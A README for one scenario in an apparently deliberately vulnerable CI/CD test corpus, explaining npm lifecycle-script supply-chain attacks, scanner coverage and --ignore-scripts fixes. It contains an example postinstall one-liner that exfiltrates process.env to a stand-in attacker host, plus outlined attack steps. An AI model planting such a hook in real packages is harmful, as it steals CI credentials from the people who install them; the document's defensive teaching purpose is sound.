# Scenario 29: npm `preinstall` / `postinstall` lifecycle script RCE

**OWASP CICD-SEC mapping:** CICD-SEC-3 (Dependency Chain Abuse)

**Vulnerable workflow:** [`.github/workflows/scenario-29-npm-lifecycle-script-rce.yml`](../../.github/workflows/scenario-29-npm-lifecycle-script-rce.yml)

**Vulnerable manifest:** [`package.json`](package.json)

## The pattern

`npm install` (and `npm ci`, unless you explicitly pass `--ignore-scripts`)
runs **lifecycle hooks** from every package in the resolved tree:
`preinstall`, `install`, `postinstall`. That includes your own
`package.json`, every direct dependency, and every transitive
dependency. The user doesn't see what those scripts do; the CI runner
just executes them with whatever environment the install step had.

A compromised maintainer of *any* package anywhere in the tree —
direct or transitive — ships a `postinstall` that runs `node -e
"require('https').get('https://attacker.tld?env=' + Buffer.from(JSON.stringify(process.env)).toString('base64'))"`,
and on the next CI install they get `NODE_AUTH_TOKEN`,
`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, internal registry creds,
and whatever else the workflow exported. **Default-on, silent, and
shipped on every install** — the easiest supply-chain primitive in
the JavaScript ecosystem.

Real precedents that all landed via lifecycle scripts:

- **`event-stream`** (2018) — `postinstall`-style injection into a
  package depended on by ~2M weekly installs.
- **`ua-parser-js`** (2021) — `preinstall` mined cryptocurrency and
  installed a credential-stealing trojan on every CI box that pulled it.
- **`node-ipc`** (2022) — `postinstall` wiped files for users on
  specific IP ranges.
- **Rolling `Shai-Hulud`-class compromises** (2024–2025) — npm
  packages whose maintainer accounts get phished, then ship a
  postinstall worm that propagates to every repo with write access
  via the leaked CI tokens.

## How an attacker exploits it

1. Compromise (or socially engineer / phish / typosquat-then-adopt) a
   maintainer account for any package in the target's dependency tree.
   Doesn't need to be a direct dep — anything reachable transitively
   works.
2. Publish a new version with a `postinstall` script that runs
   `node -e "require('https').get(...)"` and exfiltrates
   `process.env` to attacker-controlled infrastructure.
3. Target's CI runs `npm install` on next push. The script executes
   with full env. Game over for any secret the workflow exported.

The scenario's own `package.json` demonstrates the surface — it
declares both `preinstall` and `postinstall` (with fail-closed safety
payloads). The point isn't *what* the script does; the point is that
`npm install` **runs it without asking**. A scanner that flags
"package.json has lifecycle scripts and the workflow invokes `npm
install` without `--ignore-scripts`" catches the class.

## Expected scanner coverage

| Scanner            | Detection                                                                     |
| :----------------- | :---------------------------------------------------------------------------- |
| **pipeline-check** | candidate: `NPM-004` (lifecycle script declared on a package consumed at CI install time) via `--pipeline npm --npm-path scenarios/29-npm-lifecycle-script-rce`. `--pipeline github` alone may emit a `[hint]` nudging users to add the npm leg, similar to scenario 20. |
| zizmor             | ❌ (not dep-aware; doesn't read `package.json`)                              |
| poutine            | ❌                                                                            |
| KICS               | ❌                                                                            |
| Checkov            | ❌                                                                            |

> Lifecycle-script RCE is largely **outside the workflow scanner's
> remit** — proper coverage requires reading `package.json` (and the
> resolved tree). Most scanners in this corpus look at workflow YAML
> only. The scanner-relevant signal a GHA-only scan *can* still emit
> is the **absence of `--ignore-scripts`** on `npm ci` / `npm install`
> invocations; that's the half a workflow-only tool can catch.

## Fix

Pass `--ignore-scripts` on every install command:

```yaml
- name: Install dependencies (lifecycle scripts disabled)
  run: npm ci --ignore-scripts
```

Or set it globally for the runner:

```yaml
- name: Configure npm to never run lifecycle scripts
  run: npm config set ignore-scripts true
- run: npm ci
```

For defense in depth, generate a lockfile-with-integrity-hashes and
verify it:

```yaml
- run: npm ci --ignore-scripts
- run: npm audit signatures
```

If the project *needs* a lifecycle script for a legitimate
post-install step (native rebuild, etc.), allowlist it explicitly:

```yaml
- run: npm ci --ignore-scripts
- run: npm rebuild --foreground-scripts  # only own package
```

## References

- npm docs — "scripts" (lifecycle hooks):
  https://docs.npmjs.com/cli/v10/using-npm/scripts
- npm docs — `--ignore-scripts`:
  https://docs.npmjs.com/cli/v10/commands/npm-install#ignore-scripts
- event-stream incident (2018):
  https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident
- ua-parser-js incident (2021):
  https://github.com/advisories/GHSA-pjwm-rvh2-c87w
- node-ipc protest-ware (2022):
  https://snyk.io/blog/peacenotwar-malicious-npm-node-ipc-package-vulnerability/
